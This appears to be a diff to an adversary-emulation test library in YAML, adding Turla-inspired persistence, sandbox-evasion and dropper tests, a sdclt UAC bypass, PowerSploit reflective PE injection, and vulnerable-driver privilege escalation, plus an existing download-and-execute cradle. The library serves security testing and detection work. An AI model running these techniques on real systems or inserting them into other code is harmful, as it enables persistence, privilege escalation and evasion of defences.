@@ -1434,6 +1434,33 @@ stealth:
           rm -f /tmp/art_payload.sh
           rm -f /tmp/art_encrypted.zip
         name: bash
+    - name: Turla Snake Queue File Artifact
+      auto_generated_guid: 6e8dea32-206e-482c-bdfa-f1ca6a737258
+      description: |
+        Creates a fake Snake malware queue file in %windir%\Registration with the naming convention
+        <RANDOM_GUID>.<RANDOM_GUID>.crmlog, filled with random bytes to simulate encrypted data that will be decrypted by Snake's kernel driver.
+        In real samples, the decrypted queue file contans key material, communication channels, modes of operation, logs, and command specifications.
+
+        Reference: https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $guid1 = [guid]::NewGuid().ToString()
+          $guid2 = [guid]::NewGuid().ToString()
+          $filePath = "$env:windir\Registration\$guid1.$guid2.crmlog"
+          $bytes = New-Object byte[] 4096
+          (New-Object Random).NextBytes($bytes)
+          [IO.File]::WriteAllBytes($filePath, $bytes)
+          $filePath | Out-File "$env:TEMP\T1027.013_snake_queue.txt"
+        cleanup_command: |
+          $pathFile = "$env:TEMP\T1027.013_snake_queue.txt"
+          if (Test-Path $pathFile) {
+            Remove-Item (Get-Content $pathFile) -Force -ErrorAction SilentlyContinue
+            Remove-Item $pathFile -Force
+          }
   T1014:
     technique:
       type: attack-pattern
@@ -2824,6 +2851,35 @@ stealth:
           fi;
 
           '
+    - name: Turla Mosquito Sandbox Evasion via SetupDiGetClassDevs Check
+      auto_generated_guid: eed8b13f-ad93-4b1e-8fa8-57cd400a0399
+      description: |
+        Emulates the anti-sandbox / anti-emulation system check performed by the crypter used with Turla's Mosquito
+        backdoor, where after de-obfuscating its first layer, the backdoor calls the Win32 API SetupDiGetClassDevs(0,0,0,0xFFFFFFFF). On real Windows 7/10
+        hosts the call reliably returns 0xE000021A, whereas sandboxes and emulators that do not implement SetupAPI
+        correctly return a different value, allowing the malware to detect and evade analysis environments.
+
+        This test reproduces the same SetupDiGetClassDevs call via P/Invoke. It performs the API call the malware makes
+        but deliberately does not branch or exit on the result; the observable behavior under test is the anomalous
+        invocation of setupapi.dll!SetupDiGetClassDevs with the undocumented 0xFFFFFFFF (4294967295 in decimal) flag.
+
+        Reference: https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Add-Type @"
+              using System;
+              using System.Runtime.InteropServices;
+              public static class MosquitoSandboxCheck {
+                  [DllImport("setupapi.dll", SetLastError=true)]
+                  public static extern IntPtr SetupDiGetClassDevs(IntPtr ClassGuid, IntPtr Enumerator, IntPtr hwndParent, uint Flags);
+              }
+          "@
+
+          $null = [MosquitoSandboxCheck]::SetupDiGetClassDevs([IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, 4294967295)
   T1218.004:
     technique:
       type: attack-pattern
@@ -7330,6 +7386,103 @@ stealth:
           iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
           mimiload -consoleoutput -noninteractive
         name: powershell
+    - name: Reflective PE Injection via PowerSploit
+      auto_generated_guid: 114c2b95-d992-4c03-8c38-fc58420a3eb5
+      description: |
+        Uses PowerSploit's Invoke-ReflectivePEInjection to reflectively load a PE file into the
+        current PowerShell process.
+
+        Reference: https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
+      supported_platforms:
+      - windows
+      input_arguments:
+        script_url:
+          description: URL to download Invoke-ReflectivePEInjection.ps1
+          type: url
+          default: https://raw.githubusercontent.com/EmpireProject/Empire/refs/heads/dev/data/module_source/code_execution/Invoke-ReflectivePEInjection.ps1
+        script_path:
+          description: Local path to save Invoke-ReflectivePEInjection.ps1
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-ReflectivePEInjection.ps1
+        pe_path:
+          description: Path to the PE file to reflectively load
+          type: path
+          default: PathToAtomicsFolder\T1620\bin\reflective_load.dll
+        pe_url:
+          description: URL to download PE file from if not available locally
+          type: url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1620/bin/reflective_load.dll
+        exe_args:
+          description: Arguments passed to the reflectively loaded executable
+          type: string
+          default:
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Invoke-ReflectivePEInjection.ps1 must be on disk
+        prereq_command: 'if (Test-Path "#{script_path}") { exit 0 } else { exit 1
+          }
+
+          '
+        get_prereq_command: |
+          New-Item -Type Directory (Split-Path "#{script_path}") -ErrorAction Ignore -Force | Out-Null
+          Invoke-WebRequest -Uri "#{script_url}" -OutFile "#{script_path}"
+      - description: PE file must be on disk
+        prereq_command: 'if (Test-Path "#{pe_path}") { exit 0 } else { exit 1 }
+
+          '
+        get_prereq_command: |
+          Remove-Item -Path "$env:TEMP\T1620_pe_downloaded" -Force -ErrorAction SilentlyContinue
+          New-Item -Type Directory (Split-Path "#{pe_path}") -ErrorAction Ignore -Force | Out-Null
+          Invoke-WebRequest -Uri "#{pe_url}" -OutFile "#{pe_path}"
+          New-Item -Type File "$env:TEMP\T1620_pe_downloaded" -Force | Out-Null
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Import-Module "#{script_path}"
+          Invoke-ReflectivePEInjection -PEPath "#{pe_path}" -ExeArgs "#{exe_args}"
+        cleanup_command: |
+          Remove-Item "#{script_path}" -Force -ErrorAction SilentlyContinue
+          if (Test-Path "$env:TEMP\T1620_pe_downloaded") {
+            Remove-Item "#{pe_path}" -Force -ErrorAction SilentlyContinue
+            Remove-Item "$env:TEMP\T1620_pe_downloaded" -Force
+          }
+    - name: Turla Mosquito (CommanderDLL.dll) Dynamic Export Address Table (EAT) Patching
+      auto_generated_guid: 7c3e0b89-09e6-4f3c-a1e8-1c1dfa9288ce
+      description: |
+        Emulates the behavior of Turla's Mosquito main backdoor. Loads a benign DLL that has no export for "StartRoutine" on disk. During
+        DllMain, the DLL constructs an IMAGE_EXPORT_DIRECTORY in memory at the tail of its mapped image (past .reloc), then patches its own PE header's
+        data-directory entry so the export RVA points to the fabricated table. Effectively hides the DLL's real entry point from static analysis and export-name-based detection.
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_path:
+          description: Path to the compiled EAT-patching DLL
+          type: path
+          default: PathToAtomicsFolder\T1620\bin\CommanderDLL.dll
+      dependencies:
+      - description: The EAT-patching DLL must be present on disk
+        prereq_command: 'if (Test-Path "#{dll_path}") { exit 0 } else { exit 1 }
+
+          '
+        get_prereq_command: |
+          New-Item -Type Directory (Split-Path "#{dll_path}") -ErrorAction Ignore -Force | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/atomics/T1620/bin/CommanderDLL.dll?raw=true" -OutFile "#{dll_path}"
+          New-Item -Type File $env:TEMP\EAT_dll_downloaded -ErrorAction Ignore -Force | Out-Null
+      dependency_executor_name: powershell
+      executor:
+        command: |
+          Add-Type -MemberDefinition @'
+            [DllImport("kernel32.dll", SetLastError=true)]
+            public static extern IntPtr LoadLibraryA(string lpFileName);
+          '@ -Name "Win32" -Namespace "EATTest" -PassThru | Out-Null
+          [EATTest.Win32]::LoadLibraryA("#{dll_path}")
+        cleanup_command: |
+          if(Test-Path -Path $env:TEMP\EAT_dll_downloaded){
+            Remove-Item "#{dll_path}" -Force -ErrorAction Ignore
+          }
+        name: powershell
+        elevation_required: false
   T1480.002:
     technique:
       type: attack-pattern
@@ -19743,6 +19896,91 @@ privilege-escalation:
         cleanup_command: |
           reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
           schtasks /Delete /TN "#{task_name}" /F
+    - name: Turla Topinambour Dropper and Scheduled Task Persistence
+      auto_generated_guid: 1a73e89e-a5de-404d-9784-5c2aa0b38a29
+      description: |
+        Emulates the dropper behavior of Turla's Topinambour. Uses inline C# compiled via
+        Add-Type to replicate the dropper's unpack_p() and make_some_noise() functions. unpack_p() drops a
+        benign stand-in executable to %LOCALAPPDATA%\VirtualStore\certcheck.exe, and make_some_noise() creates
+        a scheduled task named VerifiedPublisherCertCheck that runs certcheck.exe every 30 minutes.
+
+        Reference: https://securelist.com/turla-renews-its-arsenal-with-topinambour/91687/
+      supported_platforms:
+      - windows
+      input_arguments:
+        benign_exe:
+          description: Benign executable to copy as the stand-in payload (simulates
+            the dropped backdoor)
+          type: path
+          default: C:\Windows\System32\hostname.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Back up any existing certcheck.exe in VirtualStore before overwriting
+        prereq_command: |
+          $dropPath = "$env:LOCALAPPDATA\VirtualStore\certcheck.exe"
+          if ((Test-Path "$env:TEMP\T1053005_certcheck_backup.exe") -or !(Test-Path $dropPath)) { exit 0 } else { exit 1 }
+        get_prereq_command: 'Copy-Item "$env:LOCALAPPDATA\VirtualStore\certcheck.exe"
+          "$env:TEMP\T1053005_certcheck_backup.exe" -Force
+
+          '
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Add-Type @'
+          using System;
+          using System.Diagnostics;
+          using System.IO;
+
+          public class TopinambourDropper {
+              public static void unpack_p(string sourceExe) {
+                  string dropPath = Path.Combine(Environment.GetEnvironmentVariable("LOCALAPPDATA"), "VirtualStore", "certcheck.exe");
+                  Directory.CreateDirectory(Path.GetDirectoryName(dropPath));
+                  File.Copy(sourceExe, dropPath, true);
+              }
+
+              public static void make_some_noise() {
+                  ProcessStartInfo startInfo = new ProcessStartInfo("cmd", "/c schtasks /create /SC MINUTE /MO 30 /TR \"%localappdata%\\VirtualStore\\certcheck.exe\" /TN VerifiedPublisherCertCheck /F")
+                  {
+                      CreateNoWindow = true,
+                      UseShellExecute = false
+                  };
+                  Process.Start(startInfo).WaitForExit();
+              }
+          }
+          '@
+          [TopinambourDropper]::unpack_p("#{benign_exe}")
+          [TopinambourDropper]::make_some_noise()
+        cleanup_command: |
+          schtasks /Delete /TN "VerifiedPublisherCertCheck" /F 2>&1 | Out-Null
+          if (Test-Path "$env:TEMP\T1053005_certcheck_backup.exe") {
+            Move-Item "$env:TEMP\T1053005_certcheck_backup.exe" "$env:LOCALAPPDATA\VirtualStore\certcheck.exe" -Force
+          } else {
+            Remove-Item "$env:LOCALAPPDATA\VirtualStore\certcheck.exe" -Force -ErrorAction SilentlyContinue
+          }
+    - name: Turla KopiLuwak Scheduled Task for JavaScript Stager
+      auto_generated_guid: 6731e8a0-5aeb-4180-8a90-4f8852e56de6
+      description: |
+        Emulates the KopiLuwak dropper's scheduled task creation stage. Creates a logon-triggered
+        scheduled task named ProactiveScan with description "NTFS Volume Health Scan" that runs
+        Chkdsk.js from the current user's AppData\Roaming\Microsoft directory with an RC4 decryption
+        key passed via the -scan parameter. The task is created using schtasks.exe matching the
+        malware's use of CreateScheduledTaskLogon. Chkdsk.js does not need to exist for the
+        scheduled task to be created.
+
+        Reference: https://securelist.com/turla-renews-its-arsenal-with-topinambour/91687/
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'schtasks /create /TN "ProactiveScan" /TR "wscript.exe \"%APPDATA%\Microsoft\Chkdsk.js\"
+          -scan Kdw6gG7cpOSZsBeH" /SC ONLOGON /F
+
+          '
+        cleanup_command: 'schtasks /Delete /TN "ProactiveScan" /F >nul 2>&1
+
+          '
   T1037:
     technique:
       type: attack-pattern
@@ -19905,6 +20143,83 @@ privilege-escalation:
           $oldprofile = cat $profile | Select-Object -skiplast 1
           Set-Content $profile -Value $oldprofile
         name: powershell
+    - name: Turla Malicious Powershell Profile for Persistence
+      auto_generated_guid: b5d7e195-4b66-428a-b6d5-04d671a13869
+      description: |
+        Creates a PowerShell profile that emulates Turla tradecraft observed in the wild. The profile checks
+        if it is running as SYSTEM (S-1-5-18) via WMI, logs execution to an XOR-obfuscated file disguised
+        as a thumbnail cache (C:\Users\Public\Downloads\thumbs.ini), reads a base64-encoded payload from
+        a registry key masquerading as an ActiveX compatibility entry, and executes it via Invoke-Expression.
+
+        Reference: https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/
+      supported_platforms:
+      - windows
+      input_arguments:
+        profile_path:
+          description: Path to the PowerShell profile to create
+          type: path
+          default: "$profile"
+        benign_payload:
+          description: Benign PowerShell command to base64-encode and store in the
+            registry as the payload
+          type: string
+          default: Get-Date
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Back up the PowerShell profile if it exists
+        prereq_command: 'if ((Test-Path "$env:TEMP\T1546.013_profile_backup") -or
+          !(Test-Path "#{profile_path}")) { exit 0 } else { exit 1 }
+
+          '
+        get_prereq_command: 'Copy-Item "#{profile_path}" "$env:TEMP\T1546.013_profile_backup"
+          -Force
+
+          '
+      - description: Back up the modified registry key if it exists
+        prereq_command: |
+          $regPath = "HKLM:\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{226ed533-f1b0-481d-ad26-0ae78bce81d7}"
+          if ((Test-Path "$env:TEMP\T1546013_activex_backup.reg") -or !(Test-Path $regPath)) { exit 0 } else { exit 1 }
+        get_prereq_command: 'reg export "HKLM\SOFTWARE\Microsoft\Internet Explorer\ActiveX
+          Compatibility\{226ed533-f1b0-481d-ad26-0ae78bce81d7}" "$env:TEMP\T1546013_activex_backup.reg"
+          /y
+
+          '
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $regPath = "HKLM:\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{226ed533-f1b0-481d-ad26-0ae78bce81d7}"
+          if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+          $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('#{benign_payload}'))
+          Set-Item -Path $regPath -Value $encodedPayload
+          $profileContent = @'
+          try
+          {
+              $SystemProc = (Get-WmiObject 'Win32_Process' | ?{$_.ProcessId -eq $PID} | % {Invoke-WmiMethod -InputObject $_ -Name 'GetOwner'} | ?{(Get-WmiObject -Class Win32_Account -Filter "name='$($_.User)'").SID -eq "S-1-5-18"})
+              if ("$SystemProc" -ne "")
+              {
+                $([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes("<m>$([DateTime]::Now.ToString('G')): STARTED </m>") | %{ $_ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append
+                [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{226ed533-f1b0-481d-ad26-0ae78bce81d7}').'(Default)')) | iex
+              }
+          }
+          catch{$([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes("<m>$([DateTime]::Now.ToString('G')): $_ </m>") | %{ $_ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append}
+          '@
+          New-Item -ItemType Directory -Path (Split-Path "#{profile_path}") -Force
+          Set-Content "#{profile_path}" -Value $profileContent -Force
+          Start-Process powershell.exe -ArgumentList "-Command", "Start-Sleep -Seconds 30" -Wait
+        cleanup_command: |
+          if (Test-Path "$env:TEMP\T1546.013_profile_backup") {
+            Move-Item "$env:TEMP\T1546.013_profile_backup" "#{profile_path}" -Force
+          } else {
+            Remove-Item "#{profile_path}" -Force -ErrorAction SilentlyContinue
+          }
+          $regPath = "HKLM\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{226ed533-f1b0-481d-ad26-0ae78bce81d7}"
+          reg delete "$regPath" /f 2>&1 | Out-Null
+          if (Test-Path "$env:TEMP\T1546013_activex_backup.reg") {
+            reg import "$env:TEMP\T1546013_activex_backup.reg" 2>&1 | Out-Null
+            Remove-Item "$env:TEMP\T1546013_activex_backup.reg" -Force
+          }
+          Remove-Item "C:\Users\Public\Downloads\thumbs.ini" -Force -ErrorAction SilentlyContinue
   T1543:
     technique:
       type: attack-pattern
@@ -20868,6 +21183,31 @@ privilege-escalation:
           reg delete "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command" /ve /f
           reg delete "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer" /ve /f
         name: command_prompt
+    - name: Warzone/AveMaria RAT style UAC bypass
+      auto_generated_guid: 350b8e4b-520b-4673-bac2-d15aa1862128
+      description: 'PowerShell code to bypass User Account Control using registry
+        modification and sdclt.exe. sdclt.exe is an auto-elevated binary, and through
+        editing the registry, it can be hijacked and a user-input process can run
+        with those same privileges. Used by the RAT Warzone/AveMaria, most likely
+        patched on modern Windows versions
+
+        '
+      supported_platforms:
+      - windows
+      input_arguments:
+        commandtorun:
+          description: Command to run
+          type: string
+          default: C:\Windows\System32\calc.exe
+      executor:
+        command: |
+          reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "#{commandtorun}" /f
+          reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f
+          Start-Process -FilePath "C:\Windows\System32\sdclt.exe" -WindowStyle Hidden -PassThru
+        cleanup_command: 'reg delete "HKCU\Software\Classes\Folder\shell" /f
+
+          '
+        name: powershell
   T1548.003:
     technique:
       type: attack-pattern
@@ -21700,7 +22040,7 @@ privilege-escalation:
         dllfilename:
           description: It specifies Dll file to run as service
           type: string
-          default: "$PathToAtomicsFolder\\T1543.003\\bin\\w64time.dll"
+          default: PathToAtomicsFolder\T1543.003\bin\W64Time.dll
       executor:
         command: |-
           copy "#{dllfilename}" %systemroot%\system32\
@@ -21709,13 +22049,17 @@ privilege-escalation:
           sc description W64Time "Maintain date and time synch on all clients and services in the network"
           reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f
           reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%systemroot%\system32\w64time.dll" /f
+          reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v Hosts /t REG_SZ /d "127.0.0.1" /f
+          reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v Security /t REG_SZ /d "127.0.0.1" /f
+          reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v TimeLong /t REG_DWORD /d 300000 /f
+          reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v TimeShort /t REG_DWORD /d 5000 /f
           sc start W64Time
         cleanup_command: |-
           sc stop W64Time
           sc.exe delete W64Time
           del %systemroot%\system32\w64time.dll
           reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /f
-          reg delete "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /f
+          reg delete "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /f
         name: command_prompt
         elevation_required: true
     - name: Remote Service Installation CMD
@@ -27175,6 +27519,49 @@ privilege-escalation:
           $EventConsumerToCleanup | Remove-WmiObject
           $EventFilterToCleanup | Remove-WmiObject
         name: powershell
+    - name: Turla WMI Persistence - Dual Filter with Base64 Payload
+      auto_generated_guid: 67cee1c5-8c9b-460b-a4c3-76a6c69bcd15
+      description: |
+        Emulates WMI event subscription persistence used by Turla. Creates a single CommandLineEventConsumer
+        with a base64-encoded PowerShell payload, then binds it to two event filters: one that triggers at a
+        specific time of day (Win32_LocalTime) and one that triggers based on system uptime
+        (Win32_PerfFormattedData_PerfOS_System).
+
+        Reference: https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/
+      supported_platforms:
+      - windows
+      input_arguments:
+        benign_payload:
+          description: Benign PowerShell command to base64-encode and use as the payload
+          type: string
+          default: Get-Date
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('#{benign_payload}'))
+          $cmdLine = "$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -enc $encodedPayload"
+
+          Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -Filter "name='Syslog Consumer'" | Remove-WmiObject
+          $consumer = Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{name='Syslog Consumer';CommandLineTemplate=$cmdLine;RunInteractively='false'}
+
+          Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='Log Adapter Filter'" | Remove-WmiObject
+          Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'Log Adapter'} | Remove-WmiObject
+          $timeQuery = "SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40"
+          $timeFilter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='Log Adapter Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$timeQuery}
+          Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$timeFilter;Consumer=$consumer}
+
+          Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='AD Bridge Filter'" | Remove-WmiObject
+          Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'AD Bridge'} | Remove-WmiObject
+          $uptimeQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 400"
+          $uptimeFilter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='AD Bridge Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$uptimeQuery}
+          Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$uptimeFilter;Consumer=$consumer}
+        cleanup_command: |
+          Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'Log Adapter'} | Remove-WmiObject
+          Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.Filter -match 'AD Bridge'} | Remove-WmiObject
+          Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='Log Adapter Filter'" | Remove-WmiObject
+          Get-WmiObject __EventFilter -Namespace root\subscription -Filter "name='AD Bridge Filter'" | Remove-WmiObject
+          Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -Filter "name='Syslog Consumer'" | Remove-WmiObject
   T1134.004:
     technique:
       type: attack-pattern
@@ -28199,6 +28586,59 @@ privilege-escalation:
           Modify" /f
         name: command_prompt
         elevation_required: true
+    - name: Turla Mosquito Run Key Persistence via rundll32 DLL Export
+      auto_generated_guid: 522c390e-8c86-497c-b37e-79a4eb072a89
+      description: |
+        Imitates the Registry Run key persistence used by Turla's Mosquito backdoor.
+
+        Upon successful execution, an `auto_update` value is written to the current user's Run key pointing to a
+        rundll32 invocation of the (benign, by default) DLL.
+
+        Reference: https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf
+      supported_platforms:
+      - windows
+      input_arguments:
+        backdoor_dll:
+          description: Path to the DLL the Run key will invoke via rundll32 (stands
+            in for the Mosquito backdoor).
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\calc.dll
+        backdoor_dll_url:
+          description: URL to download the stand-in DLL from if it is not present
+            on disk
+          type: url
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'The DLL that the Run key will point to must exist on disk at
+          #{backdoor_dll}
+
+          '
+        prereq_command: 'if (Test-Path "#{backdoor_dll}") { exit 0 } else { exit 1
+          }
+
+          '
+        get_prereq_command: |
+          New-Item -Type Directory (Split-Path "#{backdoor_dll}") -ErrorAction Ignore -Force | Out-Null
+          Invoke-WebRequest "#{backdoor_dll_url}" -OutFile "#{backdoor_dll}"
+          New-Item -ItemType File -Path "$env:TEMP\backdoor_dll_installed_by_atomic" -Force | Out-Null
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          reg export "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" "$env:TEMP\auto_update_runkey_backup.reg" /y
+          $runValue = "rundll32.exe `"#{backdoor_dll}`", StartRoutine"
+          New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "auto_update" -Value $runValue -PropertyType String -Force | Out-Null
+        cleanup_command: |
+          Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "auto_update" -Force -ErrorAction SilentlyContinue
+          if (Test-Path "$env:TEMP\auto_update_runkey_backup.reg") {
+            reg import "$env:TEMP\auto_update_runkey_backup.reg"
+            Remove-Item -Path "$env:TEMP\auto_update_runkey_backup.reg" -Force
+          }
+          if (Test-Path "$env:TEMP\backdoor_dll_installed_by_atomic") {
+            Remove-Item -Path "#{backdoor_dll}" -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path "$env:TEMP\backdoor_dll_installed_by_atomic" -Force
+          }
   T1098:
     technique:
       type: attack-pattern
@@ -30113,7 +30553,88 @@ privilege-escalation:
       - macOS
       - Windows
       x_mitre_version: '1.6'
-    atomic_tests: []
+      identifier: T1068
+    atomic_tests:
+    - name: Scattered Spider BYOVD (CVE-2015-2291 for Intel Ethernet Diagnostics Driver)
+      auto_generated_guid: 1c9ef3e6-bde6-402c-83bc-d89ea8bfd372
+      description: 'Observed TTP of threat actor Scattered Spider, where a an older,
+        legitimate, cryptographically signed Intel driver with a known vulnerability
+        is downloaded and run to escalate privileges
+
+        '
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Intel driver must exist on disk at the specified location (#{driver_path})
+
+          '
+        prereq_command: |
+          if(Test-Path "#{driver_path}") {
+              exit 0
+          } else {
+              exit 1
+          }
+        get_prereq_command: |
+          $parentpath = Split-Path "#{driver_path}"
+          New-Item -Type Directory $parentpath -ErrorAction Ignore -Force | Out-Null
+          $DriverURL = "https://github.com/magicsword-io/LOLDrivers/blob/main/drivers/c796a92a66ec725b7b7febbdc13dc69b.bin?raw=true"
+          Invoke-WebRequest -Uri $DriverURL -OutFile "#{driver_path}"
+      input_arguments:
+        driver_path:
+          description: Path to vulnerable Intel driver
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\iqvw64e.sys
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          sc.exe create iqvw64e.sys binPath="#{driver_path}" type=kernel
+          sc.exe start iqvw64e.sys
+        cleanup_command: |
+          sc.exe stop iqvw64e.sys
+          sc.exe delete iqvw64e.sys
+          Remove-Item -Recurse "#{driver_path}" -ErrorAction Ignore
+    - name: Turla Snake Malware Privilege Escalation Through VM Driver
+      auto_generated_guid: 97f621a5-851c-484f-b784-4a9c475006ec
+      description: |
+        Observed TTP of threat actor Turla in their malware Snake, where a an older, legitimate, cryptographically signed
+        VirtualBox driver with a known vulnerability is downloaded and run to escalate privileges
+
+        Reference: https://unit42.paloaltonetworks.com/turla-pensive-ursa-threat-assessment/
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Driver must exist on disk at the specified location (#{driver_path})
+
+          '
+        prereq_command: |
+          if(Test-Path "#{driver_path}") {
+              exit 0
+          } else {
+              exit 1
+          }
+        get_prereq_command: |
+          $parentpath = Split-Path "#{driver_path}"
+          New-Item -Type Directory $parentpath -ErrorAction Ignore -Force | Out-Null
+          $DriverURL = "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/eaea9ccb40c82af8f3867cd0f4dd5e9d.bin"
+          Invoke-WebRequest -Uri $DriverURL -OutFile "#{driver_path}"
+      input_arguments:
+        driver_path:
+          description: Path to vulnerable driver
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\vboxdrv.sys
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          sc.exe create vboxdrv.sys binPath="#{driver_path}" type=kernel
+          sc.exe start vboxdrv.sys
+        cleanup_command: |
+          sc.exe stop vboxdrv.sys
+          sc.exe delete vboxdrv.sys
+          Remove-Item -Recurse "#{driver_path}" -ErrorAction Ignore
   T1546:
     technique:
       type: attack-pattern
@@ -31014,12 +31535,24 @@ privilege-escalation:
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll" -OutFile "#{dllpath}"
       executor:
         command: |-
-          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
-          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value "#{dllpath}"
-          New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
+          $clsidKey = 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}'
+          $inprocKey = "$clsidKey\InprocServer32"
+          $regPath = "HKCU\SOFTWARE\Classes\CLSID\#{clsid}"
+          $backupFile = "$env:TEMP\T1546.015_com_hijack_backup.reg"
+          Remove-Item $backupFile -Force -ErrorAction Ignore
+          if (Test-Path $clsidKey) { reg export "$regPath" "$backupFile" /y | Out-Null }
+          New-Item -Path $clsidKey -Value '#{clsid_description}' -Force | Out-Null
+          New-Item -Path $inprocKey -Value "#{dllpath}" -Force | Out-Null
+          New-ItemProperty -Path $inprocKey -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String" -Force | Out-Null
